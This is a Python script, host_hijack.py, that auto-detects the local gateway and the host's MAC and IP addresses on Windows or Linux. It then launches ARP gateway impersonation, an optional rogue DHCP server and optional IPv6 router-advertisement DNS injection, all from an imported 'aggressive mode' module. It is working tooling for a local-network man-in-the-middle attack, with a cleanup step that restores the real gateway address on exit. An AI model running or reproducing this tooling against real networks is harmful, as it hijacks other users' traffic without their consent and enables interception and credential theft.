"""
host_hijack.py — run Aggressive Mode primitives directly on the host.

Docker containers can't reach the host LAN's L2, so on a dev box you
need to run this script natively with admin (Npcap installed on
Windows, root or CAP_NET_RAW on Linux). It auto-detects the default
gateway + this PC's MAC/IP and starts ARP impersonation + IPv6 RA
injection. Rogue DHCP is opt-in via ``--dhcp`` because it requires
binding UDP/67 and conflicts with anything else listening there.

Usage:
    python -m scripts.host_hijack                  # ARP + IPv6 RA only
    python -m scripts.host_hijack --dhcp           # add rogue DHCP
    python -m scripts.host_hijack --once           # send one ARP frame and exit
    python -m scripts.host_hijack --duration 30    # auto-stop after 30s

Stopping the script (Ctrl-C) automatically broadcasts a healing ARP
that restores the real gateway MAC.
"""

from __future__ import annotations

import argparse
import asyncio
import ipaddress
import platform
import re
import socket
import subprocess
import sys
from typing import Optional


def detect_gateway() -> tuple[str, str, str, str]:
    """Return (our_ip, our_mac, gateway_ip, gateway_mac)."""
    system = platform.system().lower()
    if system == "windows":
        # ipconfig /all for our IP+MAC, route print for default gateway
        cfg = subprocess.run(
            ["ipconfig", "/all"], capture_output=True, text=True,
            encoding="cp949", errors="replace",
        ).stdout
        gw_ip = None
        our_ip = None
        our_mac = None
        section: list[str] = []
        # Split by blank-line into adapter sections, pick the one that
        # actually has a default gateway + an IPv4 address
        for blob in re.split(r"\n\s*\n", cfg):
            if "Default Gateway" not in blob and "기본 게이트웨이" not in blob:
                continue
            m_gw = re.search(r"(?:Default Gateway|기본 게이트웨이)[^\n]*?(\d+\.\d+\.\d+\.\d+)", blob)
            m_ip = re.search(r"IPv4[^\n]*?(\d+\.\d+\.\d+\.\d+)", blob)
            m_mac = re.search(r"((?:[\dA-Fa-f]{2}-){5}[\dA-Fa-f]{2})", blob)
            if m_gw and m_ip and m_mac:
                gw_ip = m_gw.group(1)
                our_ip = m_ip.group(1)
                our_mac = m_mac.group(1).replace("-", ":").lower()
                break
        if not (gw_ip and our_ip and our_mac):
            raise RuntimeError("could not detect IP/MAC/gateway from ipconfig")
        # Ping the gateway, then read ARP table for its MAC
        subprocess.run(["ping", "-n", "1", "-w", "300", gw_ip],
                       capture_output=True)
        arp = subprocess.run(["arp", "-a", gw_ip], capture_output=True, text=True,
                             encoding="cp949", errors="replace").stdout
        m_gw_mac = re.search(
            re.escape(gw_ip) + r"\s+((?:[\dA-Fa-f]{2}-){5}[\dA-Fa-f]{2})", arp,
        )
        if not m_gw_mac:
            raise RuntimeError(f"could not resolve MAC for gateway {gw_ip}")
        gw_mac = m_gw_mac.group(1).replace("-", ":").lower()
        return our_ip, our_mac, gw_ip, gw_mac

    # POSIX
    route = subprocess.run(["ip", "route", "show", "default"],
                           capture_output=True, text=True).stdout
    m = re.search(r"default via (\S+) dev (\S+)", route)
    if not m:
        raise RuntimeError("no default route")
    gw_ip, iface = m.group(1), m.group(2)
    ipline = subprocess.run(["ip", "-o", "-4", "addr", "show", "dev", iface],
                            capture_output=True, text=True).stdout
    our_ip = re.search(r"inet (\d+\.\d+\.\d+\.\d+)", ipline).group(1)
    macline = subprocess.run(["ip", "link", "show", "dev", iface],
                             capture_output=True, text=True).stdout
    our_mac = re.search(r"link/ether (\S+)", macline).group(1)
    subprocess.run(["ping", "-c", "1", "-W", "1", gw_ip], capture_output=True)
    arp = subprocess.run(["ip", "neigh", "show", gw_ip],
                         capture_output=True, text=True).stdout
    gw_mac = re.search(r"lladdr (\S+)", arp).group(1)
    return our_ip, our_mac, gw_ip, gw_mac


def detect_link_local_v6(iface_hint: str = "") -> Optional[str]:
    try:
        for fam, _t, _p, _c, sockaddr in socket.getaddrinfo(socket.gethostname(), None):
            if fam == socket.AF_INET6:
                addr = sockaddr[0]
                if addr.startswith("fe80"):
                    return addr.split("%")[0]
    except Exception:
        pass
    return None


async def run(args: argparse.Namespace) -> None:
    try:
        our_ip, our_mac, gw_ip, gw_mac = detect_gateway()
    except Exception as e:
        print(f"[!] detect_gateway failed: {e}", file=sys.stderr)
        sys.exit(2)
    print(f"[+] us:      {our_ip}  ({our_mac})")
    print(f"[+] gateway: {gw_ip}  ({gw_mac})")

    from app.services.aggressive_mode import (
        ArpGatewayImpersonator, RogueDhcpServer, Ipv6RaRdnssInjector,
    )

    arp = ArpGatewayImpersonator(
        gateway_ip=gw_ip, gateway_real_mac=gw_mac,
        our_mac=our_mac, interface=args.iface,
    )
    if args.once:
        arp._send_arp(sender_mac=our_mac, target_mac="ff:ff:ff:ff:ff:ff")
        print("[+] sent ONE gratuitous ARP, exiting")
        return

    await arp.start()
    dhcp = None
    if args.dhcp:
        dhcp = RogueDhcpServer(our_ip=our_ip, real_gateway_ip=gw_ip, our_mac=our_mac)
        try: await dhcp.start()
        except Exception as e: print(f"[!] DHCP start failed: {e}")

    ra = None
    if args.ipv6:
        ll = detect_link_local_v6(args.iface)
        if ll:
            ra = Ipv6RaRdnssInjector(our_link_local_v6=ll)
            try: await ra.start()
            except Exception as e: print(f"[!] RA start failed: {e}")

    try:
        if args.duration:
            await asyncio.sleep(args.duration)
        else:
            print("[*] running — Ctrl-C to stop and heal LAN")
            while True:
                await asyncio.sleep(10)
                print(f"    [arp sent={arp._sent}]"
                      + (f" [dhcp won={dhcp._races_won}]" if dhcp else "")
                      + (f" [ra sent={ra._sent}]" if ra else ""))
    finally:
        await arp.stop()
        if dhcp: await dhcp.stop()
        if ra:   await ra.stop()
        print("[+] healed, exiting")


def main() -> None:
    p = argparse.ArgumentParser()
    p.add_argument("--iface", default="", help="interface name (auto-detect if blank)")
    p.add_argument("--dhcp", action="store_true", help="enable rogue DHCP server")
    p.add_argument("--ipv6", action="store_true", help="enable IPv6 RA RDNSS")
    p.add_argument("--once", action="store_true", help="send one ARP frame and exit")
    p.add_argument("--duration", type=int, default=0, help="auto-stop after N seconds")
    args = p.parse_args()
    try:
        asyncio.run(run(args))
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()
